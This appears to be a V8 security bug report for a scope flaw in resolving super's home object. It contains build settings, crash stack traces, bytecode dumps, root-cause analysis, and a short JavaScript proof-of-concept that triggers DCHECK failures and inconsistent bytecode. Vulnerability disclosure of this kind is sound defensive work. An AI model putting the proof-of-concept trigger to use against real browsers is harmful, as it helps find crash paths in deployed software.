# 352690885: Fatal error in Bytecode mismatch at offset 8 in interpreter.cc

## ClusterFuzz Report

```
Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md

Please see the following link for instructions on filing security bugs: https://www.chromium.org/Home/chromium-security/reporting-security-bugs

Reports may be eligible for reward payments under the Chrome VRP: https://g.co/chrome/vrp

NOTE: Security bugs are normally made public once a fix has been widely deployed.

-------------------------

VULNERABILITY DETAILS

All tests were performed on d8 12.6.228.21 Latest Release (Debug and Release) with the following args.gn:

Release:
```
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
dcheck_always_on = false
```

Debug:
```
is_component_build = true
is_debug = true
symbol_level = 2
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_backtrace = true
v8_enable_fast_mksnapshot = true
v8_enable_slow_dchecks = true
v8_optimized_debug = false
```

Multiple DChecks can be hit on v8 leading to different Bytecode Mismatches and invalid JavaScript results (see testcase_5.js, testcase_6.js).

```
testcase_1.js (d8 debug)

#
# Fatal error in ../../src/ast/scopes.cc, line 1550
# Debug check failed: scope->outer_scope()->is_class_scope().
#
#
#
#FailureMessage Object: 0x7ffdfc76f9b8
==== C stack trace ===============================

    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f9d789e0b0e]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libplatform.so(+0x52b2d) [0x7f9d6e1ddb2d]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1ea) [0x7f9d789b112a]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(+0x57afc) [0x7f9d789b0afc]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x55) [0x7f9d789b1215]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Scope::GetHomeObjectScope()+0x109) [0x7f9d74569e79]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Scope::ResolveVariable(v8::internal::VariableProxy*)+0x9a) [0x7f9d7456ceca]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Scope::ResolveVariablesRecursively(v8::internal::Scope*)+0x21a) [0x7f9d7456b68a]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::DeclarationScope::AllocateVariables(v8::internal::ParseInfo*)+0xfb) [0x7f9d74567f4b]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::DeclarationScope::Analyze(v8::internal::ParseInfo*)+0x33d) [0x7f9d74567dad]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(void v8::internal::Parser::PostProcessParseResult<v8::internal::Isolate>(v8::internal::Isolate*, v8::internal::ParseInfo*, v8::internal::FunctionLiteral*)+0xcf) [0x7f9d755b25cf]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Parser::ParseProgram(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Script>, v8::internal::ParseInfo*, v8::internal::MaybeHandle<v8::internal::ScopeInfo>)+0x4c2) [0x7f9d755a2af2]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::parsing::ParseProgram(v8::internal::ParseInfo*, v8::internal::Handle<v8::internal::Script>, v8::internal::MaybeHandle<v8::internal::ScopeInfo>, v8::internal::Isolate*, v8::internal::parsing::ReportStatisticsMode)+0x246) [0x7f9d755fe746]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x64b826c) [0x7f9d746b826c]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Compiler::GetFunctionFromEval(v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Handle<v8::internal::Context>, v8::internal::LanguageMode, v8::internal::ParseRestriction, int, int, int, v8::internal::ParsingWhileDebugging)+0x9d5) [0x7f9d746b9875]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x75c19d3) [0x7f9d757c19d3]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x75bf64b) [0x7f9d757bf64b]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Runtime_ResolvePossiblyDirectEval(int, unsigned long*, v8::internal::Isolate*)+0x106) [0x7f9d757bf326]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x5a83378) [0x7f9d73c83378]
Trace/breakpoint trap
```

```
testcase_2.js (d8 debug)

#
# Fatal error in gen/torque-generated/src/objects/js-objects-tq-inl.inc, line 33
# Check failed: !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSReceiver_NonInline(*this)).
#
#
#
#FailureMessage Object: 0x7ffcff6d27d8
==== C stack trace ===============================

    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f2ab75ecb0e]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libplatform.so(+0x52b2d) [0x7f2ab7542b2d]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1ea) [0x7f2ab75bd12a]
    ./d8(v8::internal::TorqueGeneratedJSReceiver<v8::internal::JSReceiver, v8::internal::HeapObject>::TorqueGeneratedJSReceiver(unsigned long)+0xa4) [0x5564804f0fc4]
    ./d8(v8::internal::JSReceiver::JSReceiver(unsigned long)+0x1d) [0x5564804f0ecd]
    ./d8(v8::internal::TorqueGeneratedJSObject<v8::internal::JSObject, v8::internal::JSReceiver>::TorqueGeneratedJSObject(unsigned long)+0x21) [0x5564804f0e21]
    ./d8(v8::internal::JSObject::JSObject(unsigned long)+0x1d) [0x5564804f0dad]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::TorqueGeneratedJSObject<v8::internal::JSObject, v8::internal::JSReceiver>::cast(v8::internal::Tagged<v8::internal::Object>)+0x21) [0x7f2abd840791]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Handle<v8::internal::JSObject> const v8::internal::Handle<v8::internal::JSObject>::cast<v8::internal::Object>(v8::internal::Handle<v8::internal::Object>)+0x37) [0x7f2abd83e0c7]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Handle<v8::internal::JSObject> v8::internal::Arguments<(v8::internal::ArgumentsType)0>::at<v8::internal::JSObject>(int) const+0x43) [0x7f2abe2ecba3]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x75b1f85) [0x7f2abebb1f85]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Runtime_LoadKeyedFromSuper(int, unsigned long*, v8::internal::Isolate*)+0x106) [0x7f2abebb1e46]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x5a83378) [0x7f2abd083378]
Trace/breakpoint trap
```

```
testcase_3.js (d8 debug)

#
# Fatal error in ../../src/ast/scopes.cc, line 984
# Debug check failed: cache != this implies cache->outer_scope()->deserialized_scope_uses_external_cache() || cache->GetHomeObjectScope() == this.
#
#
#
#FailureMessage Object: 0x7fff9e6bbef8
==== C stack trace ===============================

    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7fe3833ecb0e]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libplatform.so(+0x52b2d) [0x7fe383342b2d]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1ea) [0x7fe3833bd12a]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(+0x57afc) [0x7fe3833bcafc]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x55) [0x7fe3833bd215]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Scope::LookupInScopeInfo(v8::internal::AstRawString const*, v8::internal::Scope*)+0x184) [0x7fe389763c94]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Variable* v8::internal::Scope::Lookup<(v8::internal::Scope::ScopeLookupMode)1>(v8::internal::VariableProxy*, v8::internal::Scope*, v8::internal::Scope*, v8::internal::Scope*, bool)+0x281) [0x7fe389773801]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Scope::ResolveVariable(v8::internal::VariableProxy*)+0x16e) [0x7fe38976cf9e]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Scope::ResolveVariablesRecursively(v8::internal::Scope*)+0x21a) [0x7fe38976b68a]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::DeclarationScope::AllocateVariables(v8::internal::ParseInfo*)+0xfb) [0x7fe389767f4b]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::DeclarationScope::Analyze(v8::internal::ParseInfo*)+0x33d) [0x7fe389767dad]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(void v8::internal::Parser::PostProcessParseResult<v8::internal::Isolate>(v8::internal::Isolate*, v8::internal::ParseInfo*, v8::internal::FunctionLiteral*)+0xcf) [0x7fe38a7b25cf]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Parser::ParseProgram(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Script>, v8::internal::ParseInfo*, v8::internal::MaybeHandle<v8::internal::ScopeInfo>)+0x4c2) [0x7fe38a7a2af2]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::parsing::ParseProgram(v8::internal::ParseInfo*, v8::internal::Handle<v8::internal::Script>, v8::internal::MaybeHandle<v8::internal::ScopeInfo>, v8::internal::Isolate*, v8::internal::parsing::ReportStatisticsMode)+0x246) [0x7fe38a7fe746]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x64b826c) [0x7fe3898b826c]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Compiler::GetFunctionFromEval(v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Handle<v8::internal::Context>, v8::internal::LanguageMode, v8::internal::ParseRestriction, int, int, int, v8::internal::ParsingWhileDebugging)+0x9d5) [0x7fe3898b9875]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x75c19d3) [0x7fe38a9c19d3]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x75bf64b) [0x7fe38a9bf64b]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Runtime_ResolvePossiblyDirectEval(int, unsigned long*, v8::internal::Isolate*)+0x106) [0x7fe38a9bf326]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x5a83378) [0x7fe388e83378]
Trace/breakpoint trap
```

```
testcase_4.js (d8 debug)

Bytecode mismatch found for function: anonymous testcase_4.js:171
Original bytecode:
Parameter count 1
Register count 5
Frame size 40
         0x45d000401e4 @    0 : 19 ff f9          Mov <context>, r0
  217 S> 0x45d000401e7 @    3 : 15 ff 02 01       LdaImmutableContextSlot <context>, [2], [1]
         0x45d000401eb @    7 : c9                Star1
         0x45d000401ec @    8 : 17 03             LdaImmutableCurrentContextSlot [3]
         0x45d000401ee @   10 : c8                Star2
         0x45d000401ef @   11 : 13 00             LdaConstant [0]
         0x45d000401f1 @   13 : c7                Star3
         0x45d000401f2 @   14 : 0c                LdaZero
         0x45d000401f3 @   15 : c6                Star4
         0x45d000401f4 @   16 : 68 36 00 f8 04    CallRuntime [StoreToSuper], r1-r4
         0x45d000401f9 @   21 : 8f 06             Jump [6] (0x45d000401ff @ 27)
         0x45d000401fb @   23 : 10                LdaTheHole
         0x45d000401fc @   24 : ac                SetPendingMessage
         0x45d000401fd @   25 : 0b f9             Ldar r0
         0x45d000401ff @   27 : 21 01 00          LdaGlobal [1], [0]
         0x45d00040202 @   30 : af                Return
Constant pool (size = 2)
0x45d000401ad: [TrustedFixedArray]
 - map: 0x25d200000595 <Map(TRUSTED_FIXED_ARRAY_TYPE)>
 - length: 2
           0: 0x25d20024da45 <String[4]: #test>
           1: 0x25d20000424d <String[5]: #Array>
Handler Table (size = 16)
   from   to       hdlr (prediction,   data)
  (   3,  21)  ->    23 (prediction=1, data=0)
Source Position Table (size = 13)
0x045d00040221 <Other heap object (TRUSTED_BYTE_ARRAY_TYPE)>

New bytecode:
Parameter count 1
Register count 5
Frame size 40
         0x45d00040288 @    0 : 19 ff f9          Mov <context>, r0
         0x45d0004028b @    3 : 15 ff 02 01       LdaImmutableContextSlot <context>, [2], [1]
         0x45d0004028f @    7 : c9                Star1
         0x45d00040290 @    8 : 15 ff 02 02       LdaImmutableContextSlot <context>, [2], [2]
         0x45d00040294 @   12 : c8                Star2
         0x45d00040295 @   13 : 13 00             LdaConstant [0]
         0x45d00040297 @   15 : c7                Star3
         0x45d00040298 @   16 : 0c                LdaZero
         0x45d00040299 @   17 : c6                Star4
         0x45d0004029a @   18 : 68 36 00 f8 04    CallRuntime [StoreToSuper], r1-r4
         0x45d0004029f @   23 : 8f 06             Jump [6] (0x45d000402a5 @ 29)
         0x45d000402a1 @   25 : 10                LdaTheHole
         0x45d000402a2 @   26 : ac                SetPendingMessage
         0x45d000402a3 @   27 : 0b f9             Ldar r0
         0x45d000402a5 @   29 : 21 01 00          LdaGlobal [1], [0]
         0x45d000402a8 @   32 : af                Return
Constant pool (size = 2)
0x45d00040251: [TrustedFixedArray]
 - map: 0x25d200000595 <Map(TRUSTED_FIXED_ARRAY_TYPE)>
 - length: 2
           0: 0x25d20024da45 <String[4]: #test>
           1: 0x25d20000424d <String[5]: #Array>
Handler Table (size = 16)
   from   to       hdlr (prediction,   data)
  (   3,  23)  ->    25 (prediction=1, data=0)
Source Position Table (size = 0)


#
# Fatal error in ../../src/interpreter/interpreter.cc, line 241
# Bytecode mismatch at offset 8

#
#
#
#FailureMessage Object: 0x7fff7b78f4c8
==== C stack trace ===============================

    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7fdcdd628b0e]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libplatform.so(+0x52b2d) [0x7fdcdd57eb2d]
    v8_12.6.228.21/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1ea) [0x7fdcdd5f912a]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(void v8::internal::interpreter::InterpreterCompilationJob::CheckAndPrintBytecodeMismatch<v8::internal::Isolate>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Script>, v8::internal::Handle<v8::internal::BytecodeArray>)+0x38b) [0x7fdcd9bd7bfb]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::CompilationJob::Status v8::internal::interpreter::InterpreterCompilationJob::DoFinalizeJobImpl<v8::internal::Isolate>(v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Isolate*)+0x466) [0x7fdcd9bd5fd6]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::interpreter::InterpreterCompilationJob::FinalizeJobImpl(v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Isolate*)+0x127) [0x7fdcd9bd4687]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::UnoptimizedCompilationJob::FinalizeJob(v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Isolate*)+0x1fc) [0x7fdcd92ac4ac]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Compiler::CollectSourcePositions(v8::internal::Isolate*, v8::internal::Handle<v8::internal::SharedFunctionInfo>)+0x96b) [0x7fdcd92b494b]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::SharedFunctionInfo::EnsureSourcePositionsAvailable(v8::internal::Isolate*, v8::internal::Handle<v8::internal::SharedFunctionInfo>)+0xae) [0x7fdcda123dae]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x64b3646) [0x7fdcd92b3646]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Compiler::Compile(v8::internal::Isolate*, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Compiler::ClearExceptionFlag, v8::internal::IsCompiledScope*, v8::internal::CreateSourcePositions)+0x9cc) [0x7fdcd92b571c]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Compiler::Compile(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Compiler::ClearExceptionFlag, v8::internal::IsCompiledScope*)+0x40f) [0x7fdcd92b669f]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::JSFunction::CalculateExpectedNofProperties(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>)+0x1f3) [0x7fdcd9eef163]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::JSFunction::EnsureHasInitialMap(v8::internal::Handle<v8::internal::JSFunction>)+0x1cc) [0x7fdcd9eeea1c]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::JSFunction::GetDerivedMap(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::JSReceiver>)+0x28) [0x7fdcd9eef588]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::JSObject::New(v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::JSReceiver>, v8::internal::Handle<v8::internal::AllocationSite>, v8::internal::NewJSObjectType)+0x232) [0x7fdcd9f347d2]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x75f7d95) [0x7fdcda3f7d95]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(v8::internal::Runtime_NewObject(int, unsigned long*, v8::internal::Isolate*)+0x106) [0x7fdcda3f7bf6]
    v8_12.6.228.21/v8/out/x64.debug/libv8.so(+0x5a8357d) [0x7fdcd888357d]
Trace/breakpoint trap


```

```
testcase_5.js (d8 release)

TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
TypeError: Cannot read properties of null (reading '__proto__')
------------------------------Garbage Collector-----------------------------
[object Object]
```

```
testcase_6.js (d8 release)

------------------------------Garbage Collector-----------------------------
super.x - value inside class definition:  800
super.x - value outside class definition: 900

```

While analyzing the testcase, we also hit this dchecks inside Maglev:

```
#
# Fatal error in ../../src/maglev/maglev-graph-builder.h, line 700
# Debug check failed: source_position_iterator_.code_offset() > offset (1005 vs. 1007).
#
#
#
#FailureMessage Object: 0x7f849f7fc2a8
==== C stack trace ===============================

TypeError: Cannot read properties of null (reading '__proto__')
    v8_12.3.219.16/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f84db35b41e]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libplatform.so(+0x5004d) [0x7f84d17dd04d]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1ea) [0x7f84db32b97a]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libbase.so(+0x5634c) [0x7f84db32b34c]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x55) [0x7f84db32ba65]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevGraphBuilder::UpdateSourceAndBytecodePosition(int)+0x100) [0x7f84d87fb270]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevGraphBuilder::VisitSingleBytecode()+0xf1) [0x7f84d87fb3a1]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevGraphBuilder::BuildBody()+0x12b) [0x7f84d87f36bb]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevGraphBuilder::Build()+0x36c) [0x7f84d87efacc]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCompiler::Compile(v8::internal::LocalIsolate*, v8::internal::maglev::MaglevCompilationInfo*)+0x59b) [0x7f84d87ee22b]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevCompilationJob::ExecuteJobImpl(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x69) [0x7f84d88e8f49]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::OptimizedCompilationJob::ExecuteJob(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x159) [0x7f84d74d1a59]
    v8_12.3.219.16/v8/out/x64.debug/libv8.so(v8::internal::maglev::MaglevConcurrentDispatcher::JobTask::Run(v8::JobDelegate*)+0x469) [0x7f84d88ec219]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libplatform.so(v8::platform::DefaultJobWorker::Run()+0xcc) [0x7f84d17daf9c]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libplatform.so(v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread::Run()+0xaf) [0x7f84d17e3ccf]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libbase.so(v8::base::Thread::NotifyStartedAndRun()+0x36) [0x7f84db35a9f6]
    v8_12.3.219.16/v8/out/x64.debug/libv8_libbase.so(+0x847e6) [0x7f84db3597e6]
    /lib/x86_64-linux-gnu/libc.so.6(+0x94ac3) [0x7f84d0e94ac3]
    /lib/x86_64-linux-gnu/libc.so.6(+0x126850) [0x7f84d0f26850]
Trace/breakpoint trap
```

### Commit that introduced the bug:

`8f477f936c9b9e6b4c9f35a8ccc5e65bd4cb7f4e`

```
[parser] Fix home object proxy to work off-thread

Because the home object has special scope lookup rules due to class
heritage position, VariableProxies of the home object are currently
directly created on the correct scope during parsing. However, during
off-thread parsing the main thread is parked, and the correct scope
may try to dereference a main-thread Handle.

This CL moves the logic into ResolveVariable instead, which happens
during postprocessing, with the main thread unparked.
```

### Root cause:

Example:

```

/**

Compilation 1)

Frame size 8
  136 S> 0x17f6000401d4 @    0 : 15 ff 02 01       LdaImmutableContextSlot <context>, [2], [1]
         0x17f6000401d8 @    4 : ca                Star0
         0x17f6000401d9 @    5 : 17 03             LdaImmutableCurrentContextSlot [3]
         0x17f6000401db @    7 : 30 f9 00 00       GetNamedPropertyFromSuper r0, [0], [0]
         0x17f6000401df @   11 : 21 01 02          LdaGlobal [1], [2]
         0x17f6000401e2 @   14 : af                Return
Constant pool (size = 2)
0x17f60004019d: [TrustedFixedArray]
 - map: 0x2cbf00000595 <Map(TRUSTED_FIXED_ARRAY_TYPE)>
 - length: 2
           0: 0x2cbf0024da45 <String[4]: #test>
           1: 0x2cbf0000424d <String[5]: #Array>
Handler Table (size = 0)
Source Position Table (size = 12)
0x17f600040201 <Other heap object (TRUSTED_BYTE_ARRAY_TYPE)>

Compilation 2)

New bytecode:
Parameter count 1
Register count 1
Frame size 8
         0x17f60004024c @    0 : 15 ff 02 01       LdaImmutableContextSlot <context>, [2], [1]
         0x17f600040250 @    4 : ca                Star0
         0x17f600040251 @    5 : 15 ff 02 02       LdaImmutableContextSlot <context>, [2], [2]
         0x17f600040255 @    9 : 30 f9 00 00       GetNamedPropertyFromSuper r0, [0], [0]
         0x17f600040259 @   13 : 21 01 02          LdaGlobal [1], [2]
         0x17f60004025c @   16 : af                Return

**/

class var_1 {

    constructor() {

        new class var_2 {

            [new class extends (() => {
                
                super.test;

                return Array;

            })() {

            }()] = super.__proto__;

        };

    }
}

new var_1;
```

The `.home_object (super) Variable` for the access to `super` property is assigned to a wrong scope. On the first compilation, the associated scope is that of its own class. (class `var_1` on the example). Then, `LdaImmutableCurrentContextSlot [3]` is generated which access to the wrong Context.

At the property access moment, the class is under construction and the variable slots are initialized with default values. The slot that should contain the `.home_object` is by default "undefined", so it triggers a JavaScript grammar error when accessing to any property of `super`, as it is "undefined". (see testcase_1.js disabling DChecks)

We can trigger another compilation by calling the Garbage Collector and flushing the code (See testcase_4.js), which will use `Lazy Compiation (Builtins_CompileLazy)` this time, ending on a correct bytecode. This time, the scope of the `.home_object` variable is correct, but this would produce a `Bytecode Mismatch` between the two compilations.

As can be observed on testcase_5.js and testcase_6.js, we can get the two compilations in the same testcase, obtaining different values for the same object.

VERSION
Chrome Version: 126.0.6478.126 Release
Operating System: Tested on v8 Linux


REPRODUCTION CASE
- testcase_1.js
- testcase_2.js
- testcase_3.js
- testcase_4.js
- testcase_5.js
- testcase_6.js

PATCH ANALYSIS

For a fast patch, `8f477f936c9b9e6b4c9f35a8ccc5e65bd4cb7f4e` must be reversed.


FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: DCheck on V8


CREDIT INFORMATION
Reporter credit: Tashita Software Security
```

## Vulnerability Description

PoC for illegal super access bug. Uses eval('super.__proto__') inside an arrow-function extends clause, triggering a DCHECK or crash in the parser/scope chain when super is resolved in an invalid context.

## Capabilities

Triggers a DCHECK or crash in parser/scope chain due to illegal super access via eval in arrow-function extends clause. No memory read/write.
